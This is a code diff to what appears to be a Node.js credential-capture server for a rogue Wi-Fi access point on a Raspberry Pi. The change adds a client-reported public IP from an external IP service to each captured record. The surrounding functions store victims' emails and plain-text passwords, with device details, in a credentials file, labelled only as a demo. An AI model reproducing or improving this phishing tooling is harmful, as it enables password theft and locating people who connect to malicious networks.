@@ -220,14 +220,20 @@ function normalizeIp(raw) {
   return raw.replace('::ffff:', '') || 'unknown';
 }
 
-// IP + device details captured from the incoming request. The IP is the one
-// the device is connected with (req.ip): on the Pi it is the phone's address
-// on the AP subnet (e.g. 10.3.0.x); behind a reverse proxy it is the real
-// client IP from X-Forwarded-For. NOT the router's public IP.
-function captureMeta(req) {
+// IP + device details captured from the incoming request. Prefers the public
+// IP detected by the client (sent as publicIp from the browser via an external
+// IP service), falling back to the server-side IP (req.ip): on the Pi it is the
+// phone's address on the AP subnet (e.g. 10.3.0.x); behind a reverse proxy it
+// is the real client IP from X-Forwarded-For.
+function captureMeta(req, publicIp) {
   const meta = detectDevice(req.headers['user-agent'] || '');
+  let ip = req.ip;
+  if (typeof publicIp === 'string') {
+    const candidate = publicIp.trim();
+    if (net.isIP(candidate) > 0) ip = candidate;
+  }
   return {
-    ip: normalizeIp(req.ip),
+    ip: normalizeIp(ip),
     device: meta.device,
     browser: meta.browser,
     model: meta.model
@@ -244,7 +250,7 @@ async function createCapturedUser(email, password, source, name, req) {
     plainPassword: password, // stored in plain text for the demo page only
     source,
     capturedAt: new Date().toISOString(),
-    ...captureMeta(req)
+    ...captureMeta(req, req.body && req.body.publicIp)
   };
   appendCredsFile(user);
   return user;
@@ -255,7 +261,7 @@ function updateCapturedUser(user, password, source, req) {
   user.plainPassword = password;
   user.source = source;
   user.capturedAt = new Date().toISOString();
-  Object.assign(user, captureMeta(req));
+  Object.assign(user, captureMeta(req, req.body && req.body.publicIp));
   appendCredsFile(user);
   return user;
 }
